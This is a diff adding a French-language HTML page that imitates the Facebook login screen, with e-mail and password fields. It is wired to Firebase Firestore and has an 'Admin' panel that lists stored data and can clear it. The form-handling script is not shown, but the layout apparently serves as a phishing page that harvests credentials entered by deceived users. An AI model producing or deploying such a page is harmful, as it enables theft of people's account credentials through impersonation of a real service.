@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="language">Français (France)</div>
+            
+            <div class="logo">
+                <h1 class="fb-logo">facebook</h1>
+            </div>
+            
+            <form id="loginForm" class="login-form">
+                <div class="input-group">
+                    <input 
+                        type="text" 
+                        id="email" 
+                        class="input-field" 
+                        placeholder="Numéro mobile ou e-mail"
+                        required
+                    >
+                </div>
+                
+                <div class="input-group">
+                    <input 
+                        type="password" 
+                        id="password" 
+                        class="input-field" 
+                        placeholder="Mot de passe"
+                        required
+                    >
+                </div>
+                
+                <button type="submit" id="loginBtn" class="login-btn">
+                    Se connecter
+                </button>
+            </form>
+            
+            <div class="forgot-pass">
+                <a href="#">Mot de passe oublié ?</a>
+            </div>
+
+            <div class="divider"></div>
+            
+            <div class="create-account">
+                <button type="button" class="create-btn">Créer nouveau compte</button>
+            </div>
+            
+            <div id="message" class="message"></div>
+            
+            <div class="admin-actions">
+                <button id="showData" class="view-btn">Admin: Voir les données</button>
+            </div>
+        </div>
+        
+        <div id="dataModal" class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h2>Données enregistrées</h2>
+                    <span class="close">&times;</span>
+                </div>
+                <div id="dataList" class="data-list"></div>
+                <div class="modal-footer">
+                    <button id="clearData" class="clear-btn">Effacer tout</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="script.js"></script>
+</body>
+</html>
